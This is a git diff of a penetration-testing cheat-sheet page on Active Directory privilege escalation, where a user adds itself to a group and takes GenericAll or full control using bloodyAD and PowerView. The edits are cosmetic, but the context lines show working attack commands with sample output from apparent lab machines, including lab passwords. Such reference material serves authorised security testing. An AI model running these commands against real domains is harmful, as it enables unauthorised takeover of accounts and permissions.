@@ -1,19 +1,19 @@
 ---
 title: "AddSelf"
-date: 2024-8-2
+date: 2025-7-23
 tags: ["Powerview", "Genericall", "AddMember", "Group Policy", "Domain Controller", "Addself", "Active Directory", "Windows", "BloodyAD"]
 ---
 
-### Privesc #1: Add self to group (From Linux)
+### Privesc #1: Add Self to Group (From Linux)
 
 {{< tab set1 tab1 >}}bloodyAD{{< /tab >}}
 {{< tab set1 tab2 >}}powerview.py{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-#### 1. Add self to group
+#### 1. Add Self to Group
 
 ```console
-# With password
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
@@ -23,12 +23,12 @@ $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add gr
 ```
 
 ```console
-# With hashes
+# NTLM
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
 ```console
-# With Kerberos
+# Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
@@ -37,10 +37,10 @@ $ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.ab
 [+] m.lovegod added to NETWORK AUDIT
 ```
 
-#### 2. Add genericAll over target group
+#### 2. Add GenericAll over Target Group
 
 ```console
-# With password
+# Password
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
@@ -50,7 +50,7 @@ $ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add ge
 ```
 
 ```console
-# With Kerberos
+# Kerberos
 bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
 ```
 
@@ -78,7 +78,7 @@ Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
 PV > 
 ```
 
-#### 2. Add self to group
+#### 2. Add Self to Group
 
 ```console
 Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
@@ -113,7 +113,7 @@ MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
 MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
 ```
 
-#### 4. Add fullcontrol over target group
+#### 4. Add Fullcontrol over Target Group
 
 ```console
 # Exit and login again to apply changes
@@ -149,7 +149,7 @@ SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-
 
 {{< /tabcontent >}}
 
-### Privesc #1: Add self to group (From Windows)
+### Privesc #1: Add Self to Group (From Windows)
 
 {{< tab set2 tab1 >}}Windows{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
@@ -178,7 +178,7 @@ $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
 ```
 
-#### 3. Add self to group
+#### 3. Add Self to Group
 
 ```console
 Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred
